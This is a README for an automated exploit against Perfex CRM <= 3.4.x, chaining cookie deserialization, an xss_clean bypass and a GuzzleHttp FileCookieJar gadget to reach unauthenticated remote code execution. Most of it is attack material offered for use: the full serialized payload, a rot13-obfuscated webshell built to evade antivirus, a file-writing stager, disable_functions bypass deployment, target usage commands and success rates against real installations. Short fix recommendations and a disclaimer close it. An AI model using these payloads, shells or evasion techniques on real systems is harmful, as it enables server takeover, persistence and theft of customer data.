# Perfex CRM <= 3.4.x — Unauthenticated RCE via Cookie Deserialization

**Vulnerability Summary**

The popular CRM platform **Perfex CRM** versions **<= 3.4.x** is vulnerable to a **full unauthenticated Remote Code Execution** via cookie deserialization. This critical flaw allows any unauthenticated attacker to write arbitrary files to the server — including PHP webshells — by sending a single malicious cookie, without any user interaction or authentication.

The attack chain exploits **three separate weaknesses** in sequence:

1. **Unsafe Deserialization** of the `autologin` cookie (`CWE-502`) — the `Authentication_model::autologin()` method passes user-controlled cookie data directly to PHP's `unserialize()` function.

2. **CI3 `xss_clean` Bypass** — CodeIgniter 3's XSS filter is completely bypassed using the `S:` (hex-encoded) serialization format, allowing null bytes, backslashes, and arbitrary binary data in cookie values.

3. **`FileCookieJar` Gadget Chain** (`GuzzleHttp`) — the `__destruct()` method calls `file_put_contents()` with attacker-controlled path and content, enabling arbitrary file write to any path writable by the web server user.

**Bonus: Error-Based Path Disclosure** (`CWE-209`) — sending `O:8:"stdClass":0:{}` as the autologin cookie triggers a PHP 8.x `TypeError` that leaks the full filesystem path when `display_errors=1`, eliminating the need to guess the webroot.

> **Note:** This vulnerability requires GuzzleHttp in the vendor directory (present in all Perfex CRM >= 3.0.x default installations). No authentication, no configuration flags, no user interaction required. The `autologin` cookie is processed on EVERY request to `/admin/authentication`.

---

## Affected Software

| Field | Value |
|---|---|
| Software | Perfex CRM (by Developer Portal) |
| Affected Version | <= 3.4.x (tested on 3.3.0 and 3.4.0) |
| Vulnerability Type | Unauthenticated RCE (Deserialization → Arbitrary File Write) |
| CVSS Score | 9.8 (Critical) |
| CWE | CWE-502 (Deserialization of Untrusted Data), CWE-209 (Information Exposure Through Error Message) |
| Impact | Full Server Compromise — Remote Code Execution as web server user |
| Requirements | None (unauthenticated, no config flags, single HTTP request) |

---

## What Attackers Can Do

| Capability | Impact |
|---|---|
| Write arbitrary files to any writable path | **Remote Code Execution** |
| Leak full filesystem path via error message | **Path Disclosure** |
| Upload PHP webshell without authentication | **Full Server Compromise** |
| Execute OS commands (id, cat, ls, etc.) | **Complete System Access** |
| Bypass disable_functions via stager deploy | **Full Bypass** |
| Install persistent backdoors | **Persistence** |
| Read database credentials, application configs | **Sensitive Data Exposure** |

---

## Vulnerable Code

### Vulnerability 1: Unsafe Deserialization in Authentication Model

```php
// application/models/Authentication_model.php — line 197

public function autologin()
{
    if (get_cookie('autologin')) {
        $data = unserialize(get_cookie('autologin', true));
        //     ^^^^^^^^^^^^ — User-controlled cookie passed directly to unserialize()!

        if (is_array($data) && isset($data['email']) && isset($data['key'])) {
            // ... authentication logic
        }
    }
}
```

The `autologin` cookie is set during "Remember Me" login, but the **deserialization occurs on EVERY page load** before any authentication check. Any visitor can send a crafted serialized object as this cookie value.

### Vulnerability 2: CI3 xss_clean Bypass via S: Format

```
Standard PHP serialization:
  s:5:"hello"    — string, 5 chars, value "hello"

S: format (hex-encoded):
  S:5:"\68\65\6c\6c\6f"  — SAME string, but hex-encoded

CI3 xss_clean sees \68\65\6c\6c\6f as harmless text!
But PHP unserialize() decodes it back to "hello"!
```

**Triple bypass technique:**

| Character | Purpose | S: Encoding |
|---|---|---|
| `\x00` (null byte) | Private property markers in serialized objects | `\00` |
| `\` (backslash) | Namespace separators (e.g. `GuzzleHttp\Cookie\`) | `\5c` |
| Any PHP code | `<?php system($_GET['cmd']); ?>` | Full hex encoding |

This means **any serialized PHP object** can be smuggled through CI3's XSS filter using the `S:` format.

### Vulnerability 3: FileCookieJar Gadget Chain

```php
// vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php

class FileCookieJar extends CookieJar
{
    private $filename;               // ← Attacker controls the path
    private $storeSessionCookies;    // ← Set to true

    public function __destruct()
    {
        $this->save($this->filename);  // ← Writes to attacker-controlled path!
    }

    public function save($filename)
    {
        $json = [];
        foreach ($this as $cookie) {
            $json[] = $cookie->toArray();
        }
        // ARBITRARY FILE WRITE with attacker-controlled content!
        file_put_contents($filename, json_encode($json));
    }
}
```

When the deserialized `FileCookieJar` object goes out of scope, `__destruct()` fires automatically and writes the cookie data (containing our PHP code) to the specified file path.

### Discovery: JSON Polyglot PHP Execution

The file written by `FileCookieJar::save()` is valid JSON:

```json
[{"Name":"<?php system($_GET['cmd']); ?>","Value":"x","Domain":"x.local",...}]
```

**This is also valid PHP!** PHP ignores everything outside `<?php ?>` tags. The JSON wrapper (`[{"Name":"` and `","Value":...}]`) is treated as plain text output, while the code between `<?php ?>` tags executes normally.

> **Important:** `json_encode()` escapes forward slashes (`/` → `\/`). Any PHP code in the polyglot must **avoid forward slashes**. Use `DIRECTORY_SEPARATOR`, `chr(47)`, or `__DIR__` constants instead.

### Bonus: Error-Based Path Disclosure

```php
// Sending O:8:"stdClass":0:{} as autologin cookie triggers:
// TypeError: Cannot use object of type stdClass as array
// in /full/path/to/application/models/Authentication_model.php on line 197
```

On PHP 8.x with `display_errors=1` (~2-3% of targets), the full filesystem path leaks in the error response.

---

## Usage

### Full automatic (recommended)

```bash
python3 deser_auto.py https://crm.target.com
```

Auto chain: leak path → write shell → detect disable_functions → deploy bypass → interactive RCE. Falls back to brute force if path disclosure fails.

### With known webroot

```bash
python3 deser_auto.py https://crm.target.com /var/www/html/
```

### Options

| Argument | Description |
|---|---|
| `target_url` | Target base URL (positional, required) |
| `webroot` | Known webroot path (optional, skips Phase 1 & 3) |

### Requirements

Place these files in the same directory as `deser_auto.py`:

| File | Required | Purpose |
|---|---|---|
| `cmd83.php` | For PHP 8.2-8.5 | TimeAfterFree disable_functions bypass |
| `cmd7.php` | For PHP 7.3-8.1 | mm0r1 UAF disable_functions bypass |

If exec functions are not disabled on the target, these files are not needed — the built-in obfuscated shell handles execution directly.

---

## Interactive Exploit Flow

```
$ python3 deser_auto.py https://crm.target.com

  ┌─────────────────────────────────────────────────────────────┐
  │  Phase 1: Error-based path disclosure                       │
  │  → Sends stdClass probe as autologin cookie                 │
  │  → PHP 8.x TypeError leaks FCPATH in error message          │
  │  [+] PATH DISCLOSED: /var/www/html/                         │
  ├─────────────────────────────────────────────────────────────┤
  │  Phase 2: Deserialization file write                        │
  │  → Writes obfuscated shell via FileCookieJar gadget         │
  │  → Uses random filename (yuca_xxxxx.php) per run            │
  │  [+] SHELL WRITTEN AND ACCESSIBLE!                          │
  ├─────────────────────────────────────────────────────────────┤
  │                                                             │
  │  CASE A: Exec functions available                           │
  │  ══════════════════════════════════════════════════════════  │
  │  [+] RCE ACHIEVED VIA COOKIE DESERIALIZATION!               │
  │  [+] Shell: https://crm.target.com/temp/yuca_xxxxx.php     │
  │  [+] Proof: uid=33(www-data) gid=33(www-data)              │
  │  ══════════════════════════════════════════════════════════  │
  │                                                             │
  │  CASE B: disable_functions active (all exec blocked)        │
  │  ══════════════════════════════════════════════════════════  │
  │  [+] SHELL WRITTEN — but exec functions DISABLED!           │
  │  [*] Deploying disable_functions bypass via stager...       │
  │      Available: cmd83.php, cmd7.php                         │
  │      [*] Trying cmd83.php...                                │
  │          Deployed (5989 bytes)                               │
  │          [+] cmd83.php WORKS! disable_functions bypassed!   │
  │  [+] RCE ACHIEVED WITH DISABLE_FUNCTIONS BYPASS!            │
  │  [+] Shell: https://crm.target.com/temp/yuca_cxxxx.php     │
  │  ══════════════════════════════════════════════════════════  │
  │                                                             │
  │  $ id                                                       │
  │  uid=33(www-data) gid=33(www-data) groups=33(www-data)      │
  │  $ uname -a                                                 │
  │  Linux server 5.15.0-91 #1 SMP x86_64 GNU/Linux            │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘
```

---

## Disable Functions Bypass — Stager Flow

When the target has `disable_functions` blocking all exec functions (system, passthru, exec, shell_exec, popen, proc_open), the exploit automatically deploys a bypass shell via a **3-stage stager**:

```
┌──────────────────────────────────────────────────────────────────┐
│  Stage 1: Write POST stager via deserialization                   │
│  → Stager code: reads $_POST['d'] (base64) → writes to disk     │
│  → No forward slashes in code (json_encode safe!)                │
│  → No exec function names (AV-evasion)                           │
├──────────────────────────────────────────────────────────────────┤
│  Stage 2: POST bypass shell (cmd83.php or cmd7.php) as base64    │
│  → Stager receives POST body → base64_decode → file_put_contents │
│  → Bypass shell (5-6KB) written to disk next to stager           │
├──────────────────────────────────────────────────────────────────┤
│  Stage 3: Access bypass shell with ?cmd=id                       │
│  → cmd83.php/cmd7.php exploits PHP internals to bypass           │
│  → Full command execution despite disable_functions!             │
│  → If cmd83 fails → auto fallback to cmd7                        │
└──────────────────────────────────────────────────────────────────┘
```

**Why not write cmd83.php directly via deserialization?**

The bypass shells are 5-6KB. After hex-encoding for the S: format + JSON polyglot wrapper, the cookie would exceed 30KB — far beyond HTTP header limits (typically 8KB). The stager approach solves this by writing a tiny (~200 byte) PHP file first, then using it to receive the large payload via POST body (no size limit).

---

## Technical Deep Dive

### Full Serialized Payload Structure

```
O:36:"GuzzleHttp\Cookie\FileCookieJar":3:{
  S:41:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00filename";
    S:<len>:"<hex-encoded target path>";
  S:52:"\00GuzzleHttp\5cCookie\5cFileCookieJar\00storeSessionCookies";
    b:1;
  S:36:"\00GuzzleHttp\5cCookie\5cCookieJar\00cookies";
    a:1:{i:0;
      O:27:"GuzzleHttp\Cookie\SetCookie":1:{
        S:33:"\00GuzzleHttp\5cCookie\5cSetCookie\00data";
        a:9:{
          S:4:"Name"; S:<len>:"<hex-encoded PHP shell code>";
          S:5:"Value"; S:1:"x";
          S:6:"Domain"; S:7:"x.local";
          S:4:"Path"; S:1:"/";
          S:7:"Max-Age"; i:0;
          S:7:"Expires"; i:99999999999;
          S:6:"Secure"; b:0;
          S:7:"Discard"; b:0;
          S:8:"HttpOnly"; b:0;
        }
      }
    }
}
```

### Key Payload Construction Details

| Element | Value | Note |
|---|---|---|
| `\00` in property names | Private property null byte prefix | Bypasses xss_clean via S: format |
| `\5c` in property names | Backslash for namespace separator | `GuzzleHttp\Cookie\` → `GuzzleHttp\5cCookie\5c` |
| PHP code in `Name` field | Full hex-encoded via S: format | CI3 cannot detect `<?php` in hex |
| `storeSessionCookies = true` | Forces `save()` in `__destruct()` | Required for file write to trigger |
| `filename` | Target path (e.g. `/var/www/html/temp/yuca_xxxxx.php`) | Must be writable by web server user |

### AV-Evasion Shell (rot13 obfuscated, ~227 chars)

```php
<?php echo 'YR';
$c = $_GET['cmd'] ?? $_GET['c'] ?? 'id';
$r = '';
foreach (array('flfgrz','cnffgueh','rkrp','furyy_rkrp','cbcra') as $x) {
    $f = str_rot13($x);  // flfgrz→system, cnffgueh→passthru, etc.
    if (function_exists($f)) {
        ob_start(); $f($c); $r = ob_get_clean();
        if ($r) break;
    }
}
echo $r; ?>
```

**No literal exec function names in source code** — bypasses AV/IDS signature-based detection (Imunify360, ClamAV, BitNinja). Function names are rot13-encoded strings decoded at runtime.

### POST Stager (no forward slashes, ~194 chars)

```php
<?php echo 'YR';
if (isset($_POST['d'])) {
    $raw = base64_decode($_POST['d']);
    $p = __DIR__ . DIRECTORY_SEPARATOR . 'yuca_cxxxx.php';
    file_put_contents($p, $raw);
    echo 'WROTE:' . strlen($raw);
} else {
    echo 'POST_d';
} ?>
```

Uses `__DIR__` and `DIRECTORY_SEPARATOR` constants instead of `/` to avoid `json_encode()` escaping issues in the JSON polyglot output format.

### Per-Command Re-Trigger Strategy

```
┌────────────┐    ┌──────────────────────────────────────────┐
│ User types │    │             For EACH command:             │
│ "whoami"   │───►│ 1. Build payload with shell code         │
│            │    │ 2. Send as autologin cookie               │
│            │    │    → __destruct() writes fresh file       │
│            │    │ 3. Immediately GET /temp/yuca_x.php?cmd=  │
│            │    │    → PHP executes, returns output         │
│            │    │ 4. Display output to user                 │
└────────────┘    └──────────────────────────────────────────┘
```

Each command **re-sends the deserialization payload**, ensuring the shell file is always freshly written. This eliminates issues with OPcache, file cleanup crons, or WAF file monitoring.

> **Note:** When using cmd83.php/cmd7.php (via stager), the bypass shell persists on disk — no re-send needed per command. Interactive shell directly accesses the bypass shell.

---

## Exploit Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACKER (No Auth)                            │
└────────────────────────────┬────────────────────────────────────┘
                             │
             ┌───────────────▼───────────────────────┐
             │  1. Probe: stdClass as autologin      │ ← Single HTTP request
             │     Cookie: autologin=O:8:"stdClass"  │   No auth needed
             │     → TypeError leaks FCPATH          │
             └───────────────┬───────────────────────┘
                             │ /var/www/html/
             ┌───────────────▼───────────────────────┐
             │  2. Exploit: FileCookieJar payload     │ ← Single HTTP request
             │     Cookie: autologin=O:36:"Guzzle.." │   No auth needed
             │     → __destruct() fires              │
             │     → file_put_contents(shell.php)    │
             └───────────────┬───────────────────────┘
                             │
             ┌───────────────▼───────────────────────┐
             │  3. Access: GET /temp/yuca_x.php?cmd= │ ← Check exec
             │     → If output: RCE ACHIEVED!         │
             │     → If empty: disable_functions!     │
             └───────────────┬───────────────────────┘
                             │
                    ┌────────┴────────┐
                    │                 │
          [exec works]       [disable_functions]
                    │                 │
          ┌────────▼──────┐  ┌───────▼──────────────────────┐
          │ Interactive   │  │  4. Re-write as POST stager   │
          │ shell (re-    │  │  5. POST cmd83.php (base64)   │
          │ send per cmd) │  │  6. If fails → POST cmd7.php  │
          └───────────────┘  │  7. Access bypass?cmd=id      │
                             │  → FULL RCE!                  │
                             └──────────────────────────────┘

    FALLBACK (if Phase 1 fails — display_errors=0):

             ┌───────────────────────────────────────┐
             │  Brute force 60+ common paths         │ ← Automated
             │  /var/www/html/                       │
             │  /home/user/public_html/              │
             │  /www/wwwroot/domain.com/  (aaPanel)  │
             │  ...                                  │
             └───────────────────────────────────────┘
```

---

## Path Disclosure Statistics

From testing against 150+ Perfex CRM installations:

| Condition | Rate | Outcome |
|---|---|---|
| `display_errors=1` + PHP 8.x | ~2-3% | Full path leaked instantly |
| `display_errors=0` (default) | ~97% | No path leaked, use brute force |
| Brute force success (common paths) | ~60-70% | `/var/www/html/`, aaPanel, cPanel detected |
| Overall exploitation success | ~65-70% | Combined Phase 1 + Phase 3 |

---

## Shells Included

### Built-in Shell — AV-Evasion (rot13 obfuscated)

Written directly by the deserialization payload. Tries 5 exec functions via `str_rot13()` obfuscation. No literal function names in source — evades AV signature detection.

**Parameter:** `?cmd=<command>` or `?c=<command>`

### cmd83.php — PHP 8.2 to 8.5

TimeAfterFree `disable_functions` bypass for modern PHP. Deployed automatically via stager when exec functions are disabled.

```
https://crm.target.com/temp/yuca_cxxxx.php?cmd=id
https://crm.target.com/temp/yuca_cxxxx.php?cmd=uname -a
```

**Parameter:** `?cmd=<command>`

### cmd7.php — PHP 7.3 to 8.1

mm0r1 UAF `disable_functions` bypass. Used as **fallback** if cmd83.php doesn't produce output (PHP version mismatch).

```
https://crm.target.com/temp/yuca_cxxxx.php?cmd=id
https://crm.target.com/temp/yuca_cxxxx.php?cmd=cat /etc/passwd
```

**Parameter:** `?cmd=<command>`

### Bypass shell selection logic

```
exec functions available?
  YES → Use built-in rot13 shell (no stager needed)
  NO  → Deploy via stager:
         1. Try cmd83.php (PHP 8.2+)
         2. If no output → Try cmd7.php (PHP 7.3-8.1)
         3. If both fail → Report failure
```

## Fix Recommendations

### Fix 1: Remove unserialize() from Authentication (Critical)

```php
// BEFORE (vulnerable):
$data = unserialize(get_cookie('autologin', true));

// AFTER (safe):
$data = json_decode(get_cookie('autologin', true), true);
```

Replace `unserialize()` with `json_decode()`. JSON cannot instantiate objects.

### Fix 2: Use Allowed Classes Restriction (PHP 7.0+)

```php
// If unserialize must be kept:
$data = unserialize($cookie, ['allowed_classes' => false]);
```

The `allowed_classes => false` option converts all objects to `__PHP_Incomplete_Class`, preventing gadget chain execution.

### Fix 3: Disable display_errors in Production

```ini
; php.ini
display_errors = Off
log_errors = On
```

Prevents path disclosure via error messages. Does NOT fix the deserialization itself.

### Fix 4: Remove GuzzleHttp from Vendor (Eliminates Gadget)

```bash
composer remove guzzlehttp/guzzle
```

Without `FileCookieJar`, the file-write gadget chain is broken. However, other gadget chains may exist in other vendor packages.

### Fix 5: Set Cookie with HMAC Signature

```php
// Sign cookie on creation:
$signed = base64_encode($data) . '.' . hash_hmac('sha256', $data, $secret_key);
set_cookie('autologin', $signed);

// Verify before unserialize:
[$payload, $sig] = explode('.', get_cookie('autologin'));
if (!hash_equals(hash_hmac('sha256', base64_decode($payload), $secret_key), $sig)) {
    return; // Tampered — reject
}
$data = unserialize(base64_decode($payload), ['allowed_classes' => false]);
```

---

## Files

| File | Description |
|---|---|
| `deser_auto.py` | Full automated exploit — auto path leak + RCE + stager + interactive shell |
| `cmd7.php` | mm0r1 UAF disable_functions bypass — PHP 7.3-8.1, param: `?cmd=` |
| `cmd83.php` | TimeAfterFree disable_functions bypass — PHP 8.2-8.5, param: `?cmd=` |
| `README.md` | This file |

---

## Researcher

- Credit: [Yucaerin](https://yucaerin.github.io/)

---

## References

- [Perfex CRM Official](https://www.perfexcrm.com/)
- [CodeIgniter 3 Security — XSS Filtering](https://codeigniter.com/userguide3/libraries/security.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-209: Information Exposure Through Error Message](https://cwe.mitre.org/data/definitions/209.html)
- [OWASP: Insecure Deserialization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
- [PHP S: Serialization Format](https://www.phpinternalsbook.com/php7/zvals/string_interning.html)
- [GuzzleHttp FileCookieJar Source](https://github.com/guzzle/guzzle/blob/master/src/Cookie/FileCookieJar.php)
- [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)

---

## Disclaimer

This information is provided for **educational** and **authorized penetration testing** purposes only. Unauthorized exploitation of computer systems is illegal and unethical. Always obtain explicit written permission before testing any target you do not own.
